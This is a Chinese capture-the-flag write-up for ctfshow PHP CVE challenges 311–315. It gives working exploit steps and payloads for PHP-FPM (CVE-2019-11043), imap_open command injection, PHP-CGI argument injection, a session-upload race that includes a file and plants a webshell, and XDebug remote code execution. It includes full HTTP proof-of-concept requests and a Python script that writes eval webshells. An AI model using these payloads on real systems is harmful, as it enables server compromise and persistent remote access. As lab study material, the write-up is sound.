---
title: ctfshow-phpcve
id: ctfshow-phpcve
---

<!-- more -->

打算把单项都补完，整完这个还差个java--

## 311：CVE-2019-11043

[PHP-fpm 远程代码执行漏洞(CVE-2019-11043)分析 (seebug.org)](https://paper.seebug.org/1063/)

github上存在公开的exp：[neex/phuip-fpizdam: Exploit for CVE-2019-11043 ](https://github.com/neex/phuip-fpizdam)
需要go环境：[Downloads - The Go Programming Language](https://golang.google.cn/dl/)

go环境安装完成后，运行下面语句

```
go get github.com/neex/phuip-fpizdam
```

然后直接用就好：

```
phuip-fpizdam url/index.php
```

![](https://i.loli.net/2021/10/07/R8WXriTC2N7xKFh.png)

然后访问`url/?a=<your command>`执行命令即可（不行就多试几次）

![](https://i.loli.net/2021/10/07/XM6T2FfbP3kdABD.png)



## 312：CVE-2018-19518

[CVE-2018-19518：PHP imap_open函数任意命令执行漏洞复现 - FreeBuf](https://www.freebuf.com/vuls/192712.html)

bp发送如下数据包即可成功执行命令：
`echo '<?php eval($_POST[1]);' > /var/www/html/a.php`

poc：

```http
POST / HTTP/1.1
Host: your-ip
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 125

hostname=x+-oProxyCommand%3decho%09ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOycgPiAvdmFyL3d3dy9odG1sL2EucGhw|base64%09-d|sh}a&username=222&password=333
```

记得改Host
中间base64的部分就是要执行的命令，这里我是写了一个马到a.php里

![](https://i.loli.net/2021/10/07/eZDUJH1M2mQq7kt.png)

执行命令

![](https://i.loli.net/2021/10/07/vAXpzr89GOBe6VF.png)



## 313：CVE-2012-1823

[PHP-CGI远程代码执行漏洞（CVE-2012-1823）分析 (seebug.org)](https://paper.seebug.org/297/)

> 漏洞利用：
>
>  `-s`直接显示源码
>
> `-d`指定`auto_prepend_file`来制造任意文件包含漏洞

访问：

```
index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input
```

抓包post:

```
<?php echo shell_exec('ls');?>
```

或者直接用poc也行：（记得改Host）

```html
POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input HTTP/1.1
Host: example.com
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 31

<?php echo shell_exec("id"); ?>
```

![](https://i.loli.net/2021/10/07/7IQNtoFKYGSXevW.png)



## 314：session_upload+文件包含

> hint：严格说算不上cve

[利用session.upload_progress进行文件包含和反序列化渗透 - FreeBuf网络安全行业门户](https://www.freebuf.com/vuls/202819.html)

```php
<?php

error_reporting(0);

highlight_file(__FILE__);

//phpinfo
$file = $_GET['f'];

if(!preg_match('/\:/',$file)){
    include($file);
}
```

接触很多次了，直接放脚本（写了个马在a.php）

```python
import requests
import io
import threading

url = "http://fe15f2b4-caa8-4685-8872-33b3e7ebef0b.challenge.ctf.show:8080/"

sessionid = "na0h"

def write(session):
    filebytes = io.BytesIO(b'a' * 1024 * 50)
    while True:
        resp = session.post(url,
                            data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST[1]);?>'},
                            files={'file': ('na0h.png', filebytes)},
                            cookies={'PHPSESSID': sessionid})
        print("[*]writing...")


def read(session):
    while True:
        resp = session.post(url+'?f=/tmp/sess_'+sessionid,
                            data={'1': '''file_put_contents('a.php','<?php eval($_POST[1]);?>');'''},
                            cookies={'PHPSESSID': sessionid})
        if 'na0h.png' or 'offset: 1' in resp.text:
            print(resp.text)
            event.clear()
        else:
            print("[*]status:"+str(resp.status_code))

if __name__ == "__main__":
    event = threading.Event()
    with requests.session() as session:
        for i in range(5):
            threading.Thread(target=write, args=(session,)).start()
        for i in range(5):
            threading.Thread(target=read, args=(session,)).start()
    event.set()
```

![](https://i.loli.net/2021/10/07/Iqo6H8SGPTCl1gF.png)



## 315：XDebug 远程调试漏洞

> hint：debug开启，端口9000

如题：[XDebug 远程调试漏洞 (代码执行)「Vulhub 文档」](https://www.wangan.com/docs/399)

exp：[vulhub/php/xdebug-rce (github.com)](https://github.com/vulhub/vulhub/tree/master/php/xdebug-rce)

把[exp](https://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/exp.py)拷下来，跑一下：

> **重要说明：因为该通信是一个反向连接的过程，exp.py启动后其实是会监听本地的9000端口（可通过-l参数指定）并等待XDebug前来连接，所以执行该脚本的服务器必须有外网IP（或者与目标服务器处于同一内网）。**

```
# 要求用python3并安装requests库(得有公网服务器)
python3 exp.py -t url/index.php -c 'shell_exec('id');'
```

云服务器记得去改安全组，把9000端口开了即可

![](https://i.loli.net/2021/10/07/C2GHc86WsEkLSU5.png)